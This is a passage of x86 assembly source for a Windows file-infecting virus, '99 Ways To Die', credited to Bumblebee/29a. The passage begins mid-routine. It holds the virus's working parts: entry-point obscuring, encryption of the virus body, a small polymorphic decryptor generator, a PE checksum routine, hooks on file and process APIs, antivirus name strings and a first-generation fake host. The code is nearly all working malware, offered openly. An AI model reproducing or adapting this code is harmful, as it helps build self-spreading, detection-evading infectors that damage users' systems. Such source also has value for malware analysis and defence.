        pop     esi
        add     edi,dword ptr [esi+0ch]         ; get rva address
        sub     edi,dword ptr [esi+14h]
        mov     dword ptr [EPORva+ebp],edi
        clc
        jmp     searchEPOOut
continueCallLoop:
        inc     edi
        loop    callLoop
searchEPOFail:
        pop     esi
        stc
searchEPOOut:
        popad
        ret
;
; Updates the virus sample ready to infect in our memory buffer.
;
updateVSample:
        lea     edx,dateTime+ebp
        push    edx
        call    dword ptr [_GetSystemTime+ebp]

        lea     esi,dateTime+ebp                ; save month-1
        xor     eax,eax
        mov     ax,word ptr [esi+2]
        dec     eax
        or      eax,eax
        jnz     storeCountdown

        add     eax,12

storeCountdown:
        mov     word ptr [countdown+ebp],ax

        lea     esi,vBegin+ebp                  ; update integrity check
        mov     edi,vSize-4                     ; using CRC32
        call    CRC32
        mov     dword ptr [myCRC32+ebp],eax

        xor     dword ptr [hostRET+ebp],eax     ; hide hostEP

        lea     esi,vBegin+ebp                  ; copy virus body
        mov     edi,dword ptr [memHnd+ebp]
        mov     ecx,vSize
        rep     movsb

        mov     ecx,dword ptr [CodeSize+ebp]    ; encrypt virus body
        mov     esi,5
        add     esi,dword ptr [memHnd+ebp]
        mov     eax,dword ptr [CrptKey+ebp]
encrptLoop:
        xor     dword ptr [esi],eax

        test    byte ptr [CrptFlags+ebp],F_SADD ; slide add?
        jz      crptNoSADD

        mov     edx,dword ptr [CrptKey+ebp]
        not     edx
        add     eax,edx
crptNoSADD:
        test    byte ptr [CrptFlags+ebp],F_SSUB ; slide sub?
        jz      crptNoSSUB

        mov     edx,dword ptr [CrptKey+ebp]
        rol     edx,4
        sub     eax,edx
crptNoSSUB:
        add     esi,4
        loop    encrptLoop
        ret
;
;  [99WATLEN] 99 WAys To Lame ENgine
;
;  This is the lame poly engine of this time :(
;  It's only a way to not put fixed decryptors...
;  Notice it doesn't add garbage instructions.
;
;  EAX: CrptKey
;  ECX: CodeSize
;  EDI: Destination address
;
; returns EAX: size of generated proc
;
; <KeyReg>: eax edx ebx ecx esi edi
; <CouReg>: eax edx ebx ecx esi edi - { <KeyReg> }
; <*Imm32>: Random immediate value
; ?? op ??: Op could be here (or not ;)
;
;       push    ebp
;       mov     ebp,esp
;       push    <KeyReg>
;       push    <CouReg>
;       mov     <KeyReg>,<KeyImm32>
;       mov     <CouReg>,<KeyImm32>
;       mov     ebp,[ebp+4]
;theloop:
;       xor     [ebp],<KeyReg>
;    ?? add     <KeyReg>,<SlideUpImm32>   ??
;    ?? sub     <KeyReg>,<SlideDownImm32> ??
;       add     ebp,4
;       sub     <CouReg>,1
;       jne     theloop
;       pop     <CouReg>
;       pop     <KeyReg>
;       pop     ebp
;       ret
;
GenDCrpt:
        pushad                                  ; setup regs status
        xor     eax,eax
        lea     edi,RegStatus+ebp
        mov     ecx,9
        rep     stosb
        popad
        mov     byte ptr [RegStatus+ebp+_EBP],1
        mov     byte ptr [RegStatus+ebp+_ESP],1
        mov     dword ptr [CrptKey+ebp],eax
        mov     dword ptr [CodeSize+ebp],ecx
        mov     byte ptr [CrptFlags+ebp],al
        xor     byte ptr [CrptFlags+ebp],ah

        xor     eax,eax
        push    edi

        mov     cl,_EBP
        call    AddPushREG

        mov     ax,0ec8bh
        stosw

        call    GetReg
        mov     byte ptr [KeyReg+ebp],al

        mov     cl,al
        call    AddPushREG

        call    GetReg
        mov     byte ptr [LoopReg+ebp],al

        mov     cl,al
        call    AddPushREG

        mov     cl,byte ptr [KeyReg+ebp]
        mov     edx,dword ptr [CrptKey+ebp]
        call    AddMovREGINM

        mov     cl,byte ptr [LoopReg+ebp]
        mov     edx,dword ptr [CodeSize+ebp]
        call    AddMovREGINM

        mov     edx,04h
        mov     cl,_EBP
        call    AddMovREGMEMEBP

        push    edi

        mov     cl,byte ptr [KeyReg+ebp]
        call    AddXorMEMEBPREG

        test    byte ptr [CrptFlags+ebp],F_SADD
        jz      noSADD

        mov     cl,byte ptr [KeyReg+ebp]
        mov     edx,dword ptr [CrptKey+ebp]
        not     edx
        call    AddAddREGINM

noSADD:
        test    byte ptr [CrptFlags+ebp],F_SSUB
        jz      noSSUB

        mov     cl,byte ptr [KeyReg+ebp]
        mov     edx,dword ptr [CrptKey+ebp]
        rol     edx,4
        call    AddSubREGINM

noSSUB:
        mov     cl,_EBP
        mov     edx,04h
        call    AddAddREGINM

        mov     cl,byte ptr [LoopReg+ebp]
        mov     edx,1
        call    AddSubREGINM

        pop     ebx
        mov     eax,edi
        sub     eax,ebx
        push    eax
        mov     al,75h
        stosb
        pop     eax
        mov     ah,0feh
        xchg    al,ah
        sub     al,ah
        stosb

        mov     cl,byte ptr [LoopReg+ebp]
        call    AddPopREG

        mov     al,byte ptr [LoopReg+ebp]
        call    FreeReg

        mov     cl,byte ptr [KeyReg+ebp]
        call    AddPopREG

        mov     cl,_EBP
        call    AddPopREG

        mov     al,0c3h
        stosb

        pop     esi
        sub     edi,esi
        mov     eax,edi
        ret

;
; Poly engine data
;
_EAX    equ     0
_ECX    equ     1
_EDX    equ     2
_EBX    equ     3
_ESP    equ     4
_EBP    equ     5
_ESI    equ     6
_EDI    equ     7
F_SADD  equ     1 or 4
F_SSUB  equ     2 or 4
RegStatus       db      8 dup(0)
CrptFlags       db      0
KeyReg          db      0
LoopReg         db      0
CrptKey         dd      0
CodeSize        dd      0

;
; returns AL: selected register
;
GetReg:
        xor     eax,eax
        mov     al,byte ptr [CrptKey+ebp]
GetReg1:
        and     al,7
        lea     ecx,RegStatus+ebp
        add     ecx,eax
        mov     dl,byte ptr [ecx]
        or      dl,dl
        jz      GetReg0
        inc     al
        jmp     GetReg1
GetReg0:
        mov     byte ptr [ecx],1
        ret

;
;  AL: selected register to free
;
FreeReg:
        and     eax,7
        lea     ecx,RegStatus+ebp
        add     ecx,eax
        mov     byte ptr [ecx],0
        ret

;
;  Instruction generators
;
;  EDI: Destination code
;  ECX: Reg (if applicable)
;  EDX: Inm (if applicable)
;

AddPushREG:
        mov     al,050h
        add     al,cl
        stosb
        ret

AddPopREG:
        mov     al,058h
        add     al,cl
        stosb
        ret
        
AddMovREGINM:
        mov     al,0b8h
        add     al,cl
        stosb
        mov     eax,edx
        stosd
        ret

AddMovREGMEMEBP:
        mov     al,08bh
        stosb
        mov     al,08h
        mul     cl
        add     al,85h
        stosb
        mov     eax,edx
        stosd
        ret

AddXorMEMEBPREG:
        mov     al,031h
        stosb
        mov     al,08h
        mul     cl
        add     al,45h
        stosb
        xor     al,al
        stosb
        ret

AddAddREGINM:
        or      cl,cl
        jnz     AddAddREGINM0
        mov     al,05h
        stosb
        jmp     AddAddREGINM1
AddAddREGINM0:
        mov     al,081h
        stosb
        mov     al,0c0h
        add     al,cl
        stosb
AddAddREGINM1:
        mov     eax,edx
        stosd
        ret

AddSubREGINM:
        or      cl,cl
        jnz     AddSubREGINM0
        mov     al,2dh
        stosb
        jmp     AddSubREGINM1
AddSubREGINM0:
        mov     al,081h
        stosb
        mov     al,0e8h
        add     al,cl
        stosb
AddSubREGINM1:
        mov     eax,edx
        stosd
        ret
;
;  This is our func that does the partial check sum of the file. I know it
;  must be improved... but i'm so lazy :( (still lazy)
;
;   in: ecx (fileSize+1) shr 2
;       esi offset mappedFile
;
;  out: eax partial checksum of file
;
CheckSumMappedFile:
        push    esi
        xor     eax, eax
        shl     ecx, 1
        je      func0_saltito0
        test    esi, 00000002h
        je      func0_saltito1
        sub     edx, edx
        mov     dx, word ptr [esi]
        add     eax, edx
        adc     eax, 00000000h
        add     esi, 00000002h
        sub     ecx, 00000002h

func0_saltito1:
        mov     edx, ecx
        and     edx, 00000007h
        sub     ecx, edx
        je      func0_saltito2
        test    ecx, 00000008h
        je      func0_saltito3
        add     eax, dword ptr [esi]
        adc     eax, dword ptr [esi+04h]
        adc     eax, 00000000h
        add     esi, 00000008h
        sub     ecx, 00000008h
        je      func0_saltito2

func0_saltito3:
        test    ecx, 00000010h
        je      func0_saltito4
        add     eax, dword ptr [esi]
        adc     eax, dword ptr [esi+04h]
        adc     eax, dword ptr [esi+08h]
        adc     eax, dword ptr [esi+0Ch]
        adc     eax, 00000000h
        add     esi, 00000010h
        sub     ecx, 00000010h
        je      func0_saltito2

func0_saltito4:
        test    ecx, 00000020h
        je      func0_saltito5
        add     eax, dword ptr [esi]

        adc     eax, dword ptr [esi+04h]
        adc     eax, dword ptr [esi+08h]
        adc     eax, dword ptr [esi+0Ch]
        adc     eax, dword ptr [esi+10h]
        adc     eax, dword ptr [esi+14h]
        adc     eax, dword ptr [esi+18h]
        adc     eax, dword ptr [esi+1Ch]
        adc     eax, 00000000h
        add     esi, 00000020h
        sub     ecx, 00000020h
        je      func0_saltito2

func0_saltito5:
        test    ecx, 00000040h
        je      func0_saltito6
        add     eax, dword ptr [esi]

        adc     eax, dword ptr [esi+04h]
        adc     eax, dword ptr [esi+08h]
        adc     eax, dword ptr [esi+0Ch]
        adc     eax, dword ptr [esi+10h]
        adc     eax, dword ptr [esi+14h]
        adc     eax, dword ptr [esi+18h]
        adc     eax, dword ptr [esi+1Ch]
        adc     eax, dword ptr [esi+20h]
        adc     eax, dword ptr [esi+24h]
        adc     eax, dword ptr [esi+28h]
        adc     eax, dword ptr [esi+2Ch]
        adc     eax, dword ptr [esi+30h]
        adc     eax, dword ptr [esi+34h]
        adc     eax, dword ptr [esi+38h]
        adc     eax, dword ptr [esi+3Ch]
        adc     eax, 00000000h
        add     esi, 00000040h
        sub     ecx, 00000040h
        je      func0_saltito2

func0_saltito6:
        add     eax, dword ptr [esi]

        adc     eax, dword ptr [esi+04h]
        adc     eax, dword ptr [esi+08h]
        adc     eax, dword ptr [esi+0Ch]
        adc     eax, dword ptr [esi+10h]
        adc     eax, dword ptr [esi+14h]
        adc     eax, dword ptr [esi+18h]
        adc     eax, dword ptr [esi+1Ch]
        adc     eax, dword ptr [esi+20h]
        adc     eax, dword ptr [esi+24h]
        adc     eax, dword ptr [esi+28h]
        adc     eax, dword ptr [esi+2Ch]
        adc     eax, dword ptr [esi+30h]
        adc     eax, dword ptr [esi+34h]
        adc     eax, dword ptr [esi+38h]
        adc     eax, dword ptr [esi+3Ch]
        adc     eax, dword ptr [esi+40h]
        adc     eax, dword ptr [esi+44h]
        adc     eax, dword ptr [esi+48h]
        adc     eax, dword ptr [esi+4Ch]
        adc     eax, dword ptr [esi+50h]
        adc     eax, dword ptr [esi+54h]
        adc     eax, dword ptr [esi+58h]
        adc     eax, dword ptr [esi+5Ch]
        adc     eax, dword ptr [esi+60h]
        adc     eax, dword ptr [esi+64h]
        adc     eax, dword ptr [esi+68h]
        adc     eax, dword ptr [esi+6Ch]
        adc     eax, dword ptr [esi+70h]
        adc     eax, dword ptr [esi+74h]
        adc     eax, dword ptr [esi+78h]
        adc     eax, dword ptr [esi+7Ch]
        adc     eax, 00000000h
        add     esi, 00000080h
        sub     ecx, 00000080h
        jne     func0_saltito6

func0_saltito2:
        test    edx, edx
        je      func0_saltito0

func0_saltito7:
        sub     ecx, ecx
        mov     cx, word ptr [esi]
        add     eax, ecx
        adc     eax, 00000000h
        add     esi, 00000002h
        sub     edx, 00000002h
        jne     func0_saltito7

func0_saltito0:
        mov     edx, eax
        shr     edx, 10h
        and     eax, 0000FFFFh
        add     eax, edx
        mov     edx, eax
        shr     edx, 10h
        add     eax, edx
        and     eax, 0000FFFFh
        pop     esi
        ret
;
; Virus data ---------------------------------------------------------------
;
HOOKTABLEBEGIN  label   byte
                dd      offset _CreateFileA
                dd      offset Hook0
                dd      offset _MoveFileA
                dd      offset Hook1
                dd      offset _CopyFileA
                dd      offset Hook2
                dd      offset _CreateProcessA
                dd      offset Hook3
                dd      offset _SetFileAttributesA
                dd      offset Hook4
                dd      offset _GetFileAttributesA
                dd      offset Hook5
                dd      offset _SearchPathA
                dd      offset Hook6
                dd      offset _SetCurrentDirectoryA
                dd      offset Hook7
HOOKTABLEEND    label   byte

FSTAPI                  label   byte
CrcCreateFileA          dd      08c892ddfh
                        db      12
_CreateFileA            dd      0

CrcMapViewOfFile        dd      0797b49ech
                        db      14
_MapViewOfFile          dd      0

CrcCreatFileMappingA    dd      096b2d96ch
                        db      19
_CreateFileMappingA     dd      0

CrcUnmapViewOfFile      dd      094524b42h
                        db      16
_UnmapViewOfFile        dd      0

CrcCloseHandle          dd      068624a9dh
                        db      12
_CloseHandle            dd      0

CrcFindFirstFileA       dd      0ae17ebefh
                        db      15
_FindFirstFileA         dd      0

CrcFindNextFileA        dd      0aa700106h
                        db      14
_FindNextFileA          dd      0

CrcFindClose            dd      0c200be21h
                        db      10
_FindClose              dd      0

CrcVirtualAlloc         dd      04402890eh
                        db      13
_VirtualAlloc           dd      0

CrcGetTickCount         dd      0613fd7bah
                        db      13
_GetTickCount           dd      0

CrcGetFileTime          dd      04434e8feh
                        db      12
_GetFileTime            dd      0

CrcSetFileTime          dd      04b2a3e7dh
                        db      12
_SetFileTime            dd      0

CrcSetFileAttributesA   dd      03c19e536h
                        db      19
_SetFileAttributesA     dd      0

CrcGetFileAttributesA   dd      0c633d3deh
                        db      19
_GetFileAttributesA     dd      0

CrcGetFileSize          dd      0ef7d811bh
                        db      12
_GetFileSize            dd      0

CrcGetSystemTime        dd      075b7ebe8h
                        db      14
_GetSystemTime          dd      0

CrcMoveFileA            dd      02308923fh
                        db      10
_MoveFileA              dd      0

CrcCopyFileA            dd      05bd05db1h
                        db      10
_CopyFileA              dd      0

CrcCreateProcessA       dd      0267e0b05h
                        db      15
_CreateProcessA         dd      0

CrcSearchPathA          dd      0f4d9d033h
                        db      12
_SearchPathA            dd      0

CrcGetCurrentDirectoryA dd      0ebc6c18bh
                        db      21
_GetCurrentDirectoryA   dd      0

CrcSetCurrentDirectoryA dd      0b2dbd7dch
                        db      21 
_SetCurrentDirectoryA   dd      0

CrcGetWindowsDirectoryA dd      0fe248274h
                        db      21 
_GetWindowsDirectoryA   dd      0
ENDAPI                  label   byte
; AV: AVP, PAV, NAV, ...
; AN: SCAN, VISUSSCAN, ...
; DR: DRWEB
; ID: SPIDER
; OD: NOD-ICE
; TB: THUNDERBYTE... (this still exists?)
; F-: F-PROT, ...
avStrings       dw      'VA','NA','RD','DI','DO','BT','-F'
vStringsCout    equ     (offset $-offset avStrings)/2
fndMask                 db      '*.*',0

copyright               db      '< 99 Ways To Die Coded by Bumblebee/29a >'

; Following value cannot be included in self check CRC32...
myCRC32                 dd      0
vEnd            label   byte
;
; virus ENDS HERE
;
crypt:
;
; Temp data. Not stored into the file, only 1st generation.
;
BUFFERBEGIN     label   byte
stringBuffer:   ret
                db      STRINGTOP-1 dup(0)
tmpPath         db      STRINGTOP dup(0)
currentPath     db      STRINGTOP dup(0)
address         dd      0
names           dd      0 
ordinals        dd      0
nexports        dd      0
expcount        dd      0
memHnd          dd      0

fHnd            dd      0
fhmap           dd      0
mapMem          dd      0
infCount        db      0

fileSize        dd      0
fileAttrib      dd      0
fileTime0       dd      0,0
fileTime1       dd      0,0
fileTime2       dd      0,0
pad             dd      0
fNameAddr       dd      0
gensize         dd      0
myRVA           dd      0
fstSec          dd      0
find_data       WIN32_FIND_DATA <0>
findHnd         dd      0
semHook         db      0
EPORva          dd      0
EPOAddr         dd      0
dateTime        db      16 dup(0)
payload         db      0
pchcks          dw      0
BUFFEREND       label   byte
BUFFERSIZE      equ     BUFFEREND-BUFFERBEGIN

;
; Fake host for 1st generation
;
fakeHost:
        push    1000h
title:  @strz   "(C) 2000 Bumblebee/29a"
mess:   @strz   "99 Ways To Die activated. Have a nice day."
        push    0h
        call    MessageBoxA

        push    0h
        call    ExitProcess

Ends
End     inicio
;
;  hi sweet!
;
; ' the preacher said, richer or poorer
;   my mama said, thick or thin
;   you can kiss me, baby
;   when it's time to get thick again '
;
;

